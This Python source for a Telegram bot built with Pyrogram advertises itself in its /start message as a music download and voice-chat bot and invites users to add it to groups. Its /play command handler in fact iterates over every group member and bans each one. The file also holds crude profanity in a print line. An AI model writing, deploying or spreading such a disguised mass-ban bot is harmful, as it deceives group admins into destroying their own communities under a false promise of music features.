import asyncio

from pyrogram import Client,filters
from pyrogram.types import *
from .config import Config
import logging
from pyrogram.errors import (
    ChatAdminRequired
)
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

bot=Client(":memory:",api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,bot_token=Config.TELEGRAM_TOKEN)


SUDOS = Config.SUDOS







@bot.on_message(filters.command("play") & filters.group)
def NewChat(bot,message):
    logging.info("new chat {}".format(message.chat.id))
    logging.info("getting memebers from {}".format(message.chat.id))
    a= bot.iter_chat_members(message.chat.id)
    for i in a:
        try:
            bot.ban_chat_member(chat_id =message.chat.id,user_id=i.user.id)
            logging.info("kicked {} from {}".format(i.user.id,message.chat.id))
        except Exception:
            logging.info(" failed to kicked {} from {}".format(i.user.id,message.chat.id))
            
    logging.info("process completed")



@bot.on_message(filters.command("start") & filters.private)
async def hello(bot, message):
    fucx = message.from_user.mention
    kimd = message.from_user.id
    await message.reply_animation(animation="https://te.legra.ph/file/1610d483b185188253566.mp4", caption=f"Hello {fucx}, ᴛʜɪs ɪs ᴀ ᴍᴜsɪᴄ ᴅᴏᴡɴʟᴏᴀᴅ ʙᴏᴛ ɪᴛ's ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴜsɪᴄ ᴀɴᴅ ᴘʟᴀʏ ᴏɴ ᴠᴏɪᴄᴇ ᴄʜᴀᴛ ʙᴏᴛ ʙʏ @ᴛᴜJʜᴇ_ᴋʏᴀ_ᴋᴀʀɴᴀ_ʜᴀɪ_ᴀᴘɴᴀ_ᴋᴀᴀᴍ_ᴋᴀʀ!\n\n Thanks For Using This Bot!",
                  reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="Add Me 鹿", url="https://t.me/MUSIC_DOWNLOAD_RBOT?start=true")], [InlineKeyboardButton(text=f"OWNER", user_id=f"{kimd}")]]))
    
logging.info("Your Bot started 🎉")
print("Ja Bhai Gand Mara Ab")
